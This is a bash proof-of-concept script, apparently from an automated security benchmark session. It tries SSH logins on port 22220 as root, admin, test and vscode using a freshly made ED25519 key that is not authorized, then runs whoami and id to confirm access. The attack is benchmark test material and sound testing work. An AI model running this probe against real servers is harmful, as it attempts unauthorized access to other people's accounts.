#!/bin/bash
# POC: Demonstrates SSH authentication bypass on port 22220 by authenticating with a randomly generated ED25519 key pair that is not registered in any authorized_keys file
# Target: ./repo
# Created: 2025-11-05T16:51:21.723Z
# Session: benchmark-XBEN-084-24-mhm7issr

# SSH ED25519 Authentication Bypass POC
# Demonstrates authentication bypass on SSH server at localhost:22220
# by using a randomly generated ED25519 key pair

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-22220}"
TEST_USERS=("root" "admin" "test" "vscode")

echo "[*] SSH ED25519 Authentication Bypass POC"
echo "[*] Target: $TARGET_HOST:$TARGET_PORT"
echo ""

# Step 1: Generate a random ED25519 key pair
echo "[+] Step 1: Generating random ED25519 key pair..."
KEY_DIR=$(mktemp -d)
KEY_FILE="$KEY_DIR/test_key"
ssh-keygen -t ed25519 -f "$KEY_FILE" -N "" -C "exploit@test" > /dev/null 2>&1
echo "[+] Generated key: $KEY_FILE"
echo "[+] Public key fingerprint:"
ssh-keygen -l -f "$KEY_FILE.pub"
echo ""

# Step 2: Verify the key is NOT in any authorized_keys
echo "[+] Step 2: Public key (not registered on system):"
cat "$KEY_FILE.pub"
echo ""

# Step 3: Attempt SSH connections with each test user
echo "[+] Step 3: Attempting SSH authentication with unauthorized key..."
echo ""

SUCCESS_COUNT=0

for user in "${TEST_USERS[@]}"; do
    echo "[*] Testing user: $user"
    
    # Try SSH connection with the unauthorized key
    # Capture output and check if command executed
    OUTPUT=$(ssh -i "$KEY_FILE" \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 \
        -o BatchMode=yes \
        -p "$TARGET_PORT" \
        "${user}@${TARGET_HOST}" \
        "whoami; id; echo 'Command execution successful'" 2>&1 || true)
    
    if echo "$OUTPUT" | grep -q "Command execution successful"; then
        echo "[+] SUCCESS: Authenticated as $user with unauthorized key!"
        echo "$OUTPUT"
        ((SUCCESS_COUNT++))
    else
        echo "[-] Failed to authenticate as $user"
        echo "$OUTPUT"
    fi
    echo ""
done

# Cleanup
rm -rf "$KEY_DIR"

# Report results
echo "[*] =========================================="
echo "[*] POC Results:"
echo "[*] =========================================="
echo "[*] Successful authentications: $SUCCESS_COUNT / ${#TEST_USERS[@]}"

if [ $SUCCESS_COUNT -gt 0 ]; then
    echo "[!] VULNERABILITY CONFIRMED: SSH accepts unauthorized ED25519 keys"
    exit 0
else
    echo "[-] Could not confirm vulnerability with provided target"
    exit 1
fi